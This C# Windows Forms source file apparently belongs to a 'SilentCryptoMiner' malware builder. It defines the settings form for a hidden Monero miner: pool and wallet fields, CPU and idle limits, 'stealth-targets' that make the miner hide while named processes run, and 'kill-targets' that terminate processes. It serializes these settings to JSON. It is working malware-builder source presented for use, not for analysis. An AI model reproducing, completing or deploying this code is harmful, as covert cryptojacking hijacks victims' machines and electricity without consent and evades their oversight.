using System;
using System.Drawing;
using System.Windows.Forms;

namespace SilentCryptoMiner
{
    public partial class MinerXMR
    {
        public MinerXMR()
        {
            InitializeComponent();
        }

        public Builder F;
        public int nid = 0;

        private void Form1_Load(object sender, EventArgs e)
        {
            Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            formMinerXMR.SubHeader = nid + " - " + comboAlgorithm.Text;
            F.ReloadMinerList();
        }

        private void MinerXMR_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            F.ReloadMinerList();
            Hide();
        }

        public override string ToString() => $"{nid}: {comboAlgorithm.Text} - {txtPoolURL.Text}";

        private void toggleIdle_CheckedChanged(object sender)
        {
            comboIdleCPU.Enabled = toggleIdle.Checked;
            txtIdleWait.Enabled = toggleIdle.Checked;
        }

        private void chkRemoteConfig_CheckedChanged(object sender) => txtRemoteConfig.Enabled = chkRemoteConfig.Checked;

        private void chkAdvParam_CheckedChanged(object sender) => txtAdvParam.Enabled = chkAdvParam.Checked;

        private void chkAPI_CheckedChanged(object sender) => txtAPI.Enabled = chkAPI.Checked;

        private void comboAlgorithm_SelectedIndexChanged(object sender, EventArgs e) => formMinerXMR.SubHeader = nid + " - " + comboAlgorithm.Text;

        private void tabcontrolMinerXMR_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (txtPoolURL.Text.Contains(":"))
            {
                txtJSON.Text =
$@"{{
    ""algo"": ""{comboAlgorithm.Text}"",
    ""pool"": ""{txtPoolURL.Text.Split(':')[0]}"",
    ""port"": {txtPoolURL.Text.Split(':')[1]},
    ""wallet"": ""{txtPoolUsername.Text}"",
    ""password"": ""{txtPoolPassword.Text}"",
    ""nicehash"": {toggleNicehash.Checked.ToString().ToLower()},
    ""ssltls"": {toggleSSL.Checked.ToString().ToLower()},
    ""max-cpu"": {comboMaxCPU.Text.Replace("%", "")},
    ""idle-wait"": {(toggleIdle.Checked ? txtIdleWait.Text : "0")},
    ""idle-cpu"": {comboIdleCPU.Text.Replace("%", "")},
    ""stealth-targets"": ""{(toggleStealth.Checked ? txtStealthTargets.Text : "")}"",
    ""kill-targets"": ""{(toggleProcessKiller.Checked ? txtKillTargets.Text : "")}""
}}";
            }
        }
    }
}